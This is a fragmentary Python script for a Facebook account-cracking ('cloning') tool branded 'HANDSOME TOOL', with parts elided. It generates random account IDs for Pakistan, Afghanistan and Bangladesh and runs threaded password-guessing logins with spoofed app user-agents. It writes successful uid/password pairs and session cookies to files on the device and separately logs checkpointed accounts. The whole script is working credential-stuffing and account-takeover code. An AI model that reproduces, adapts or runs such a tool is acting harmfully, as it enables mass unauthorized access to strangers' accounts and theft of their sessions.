...
try:
    ...
    print('')
    #time.sleep(2)
    #os.system(f'xdg-open www.facebook.com/profile.php?id=100078655686966')
...
print('\033[0;97m[•] \033[0;92mHANDSOME TOOL IS TRACKING YOUR IP ADDRESS')
time.sleep(2)
...
\033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.12    
...
while key == 'true':
    ...
    if username == CorrectUsername:
            print('\033[1;97m====================================================\n\033[0;97m[•]\033[1;32m LOGGED IN HANDSOME TOOL SUCCESSFULLY') 
            time.sleep(1)
            clear()
            key = 'false'
        ...
        try:
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                clear()
                                print('\t\x1b[1;92m   HANDSOME TOOL RANDOM CLONING MENU')
                                linex()
...
def pak():
                user=[]
                clear()
                print('\t\x1b[1;92m  HANDSOME TOOL PAK RANDOM CLONER MENU')
                linex()
                ...
                with tred(max_workers=30) as BOSS:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   HANDSOME TOOL RANDOM PAK CRACKING MENU')
                        linex()
                ...
                print('\033[0;97m[•]\x1b[1;92m THE PROCESS HAS COMPLETED ')
                print('\033[0;97m[•]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/HANDSOME-rndm-COOKIE.txt') 
                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/HANDSOME-rndm-OK.txt')
                linex()
...
def afg():
                user=[]
                clear()
                print('\t\x1b[1;92m  HANDSOME TOOL AFG RANDOM CLONER MENU')
                linex()
                ...
                with tred(max_workers=30) as BOSS:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   HANDSOME TOOL RANDOM AFG CRACKING MENU')
                        linex()
                        print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[•] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
...
def bd():
                user=[]
                clear()
                print('    \x1b[1;92mHANDSOME TOOL BANGLADESH RANDOM  CLONER MENU')
                linex()
                ...
                with tred(max_workers=30) as BOSS:     
                        clear()
                        tl = str(len(user))
                        print('      \x1b[1;92mHANDSOME TOOL RANDOM BANGLADESH CRACKING MENU')
                        linex()
                        print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[•] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
                ...
                try:
                    ...
                    'user-agent': ua}
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;92m[\033[0;96mHANDSOME-OK\033[0;92m]\033[1;91m '+ids+' \033[1;37m|\033[1;31m '+pas+ ' '+joined(ids)+' ')
                                                twf.append(ids)
                                                break           
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mHANDSOME-CRACKING\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                    ...
                    'user-agent': ua}#'Mozilla/5.0 (Linux; Android 10; CPH2121 Build/RP1A.200720.010; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/358.0.0.34.117;]'}
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/HANDSOME-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                                        print('\r\r\x1b[1;92m[\033[0;97mHANDSOME-OK\033[0;92m]\033[1;92m '+uid+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(uid)+' ')      
                                                        #print("Cookie: "+coki)
                                                        open('/sdcard/HANDSOME-rndm-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        open('/sdcard/HANDSOME-rndm-COOKIE.txt', 'a').write(uid+'|'+pas+'|'+coki+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\x1b[1;92m[\033[0;91mHANDSOME-CP\033[0;92m] \033[0;90m'+uid+' \033[0;97m|\033[0;90m '+pas+'\033[1;97m')
                                                open('/sdcard/HANDSOME-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                else:
                                        continue
